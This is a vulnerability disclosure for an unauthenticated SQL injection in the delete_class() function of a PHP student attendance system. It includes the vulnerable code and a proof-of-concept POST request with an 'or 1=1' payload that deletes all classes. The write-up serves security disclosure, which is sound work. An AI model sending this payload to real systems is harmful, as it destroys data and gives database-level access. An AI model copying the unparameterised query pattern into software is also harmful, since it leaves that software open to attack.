## Vulnerability Details

**Credits**: 
> Reigz Macolor (https://github.com/reigz/)<br/>

**Tested On**:
> [Simple Student Attendance System using PHP and MySQL 1.0](https://www.sourcecodester.com/php/17018/simple-student-attendance-system-using-php-and-mysql.html) <br/>

**Affected Version**:
> Simple Student Attendance System using PHP and MySQL 1.0

**Affected Site Page**: 
> /ajax-api.php<br/>

**Affected Code**: 
> </ajax-api.php [function delete_class()]> <br/>

```php
public function delete_class(){
    extract($_POST);
    $delete = $this->conn->query("DELETE FROM `class_tbl` where `id` = '{$id}'");
    if($delete){
        $_SESSION['flashdata'] = [ 'type' => 'success', 'msg' => "Class has been deleted successfully!" ];
        return [ "status" => "success" ];
    }else{
        $_SESSION['flashdata'] = [ 'type' => 'danger', 'msg' => "Class has failed to deleted due to unknown reason!" ];
        return [ "status" => "error", "Class has failed to deleted!" ];
    }
}
```

**Related CWE:**
> [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)

## **Details:**
> Allows SQL Injection by placing untrusted code executing a query on the backend, for the POC all classes are deleted without any authentication

![image](https://github.com/smurf-reigz/security/assets/48426940/b74a2c69-b612-4b7d-a61d-04e2320e2173)

```http 
POST /ajax-api.php?action=delete_class HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 19
Connection: close

id=1337'+or+1=1;--+
```

> DELETES all classes without authentication.

![image](https://github.com/smurf-reigz/security/assets/48426940/49ac0660-57e5-4cb0-9c4c-288b215d4ccd)


## **Vulnerability Impact:**
> As an attacker, can do the following:
> 1. Run any database query and have same permission as the web application (default for this Web Application is root).
